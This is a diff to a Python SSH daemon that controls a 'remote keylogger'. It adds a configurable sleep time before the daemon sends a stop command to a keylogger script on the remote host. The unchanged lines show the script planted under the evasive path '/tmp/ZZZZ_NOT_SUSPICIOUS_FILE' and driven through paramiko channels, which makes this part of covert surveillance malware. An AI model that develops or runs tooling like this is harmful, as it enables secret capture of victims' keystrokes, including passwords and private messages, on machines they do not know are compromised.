@@ -71,6 +71,8 @@ requestQueueSize = 1024
 pidfile = "/tmp/daemonServer.pid"
 # host key for an SSH connection
 host_key = paramiko.RSAKey(filename="test_rsa.key")
+# Sleep time (seconds) for daemon server
+sleepTime = 24
 
 
 def grimReaper(signum,  frame):
@@ -107,6 +109,10 @@ def parseCmdArgument():
     parser.add_argument('-status', type=str,
                         help="start (execute server program) | stop (kill server)",
                         required=True)
+                            # argument for execution status of the server
+    parser.add_argument('-sleep', type=int,
+                        help="time to put daemon to sleep before stopping remote keylogger",
+                        default=24)
     # return the parsed command line arguments
     return parser.parse_args()
 
@@ -287,7 +293,7 @@ def startRemoteKeylogger(sshChannel):
 
 
 def stopRemoteKeylogger(sshChannel):
-    time.sleep(28)
+    time.sleep(sleepTime)
     logger.info(
         "Sending command: python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE stop")
     sshChannel.send("python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE stop")
@@ -378,6 +384,7 @@ def serverForever(commandArgs, pathDirectory):
 if __name__ == '__main__':
     # Parse command line arguments
     commandArgs = parseCmdArgument()
+    sleepTime = commandArgs.sleep
 
     # Add logging to logfile and disable output to the terminal
     logzero.logfile("sshDaemon.log", maxBytes=1e6,
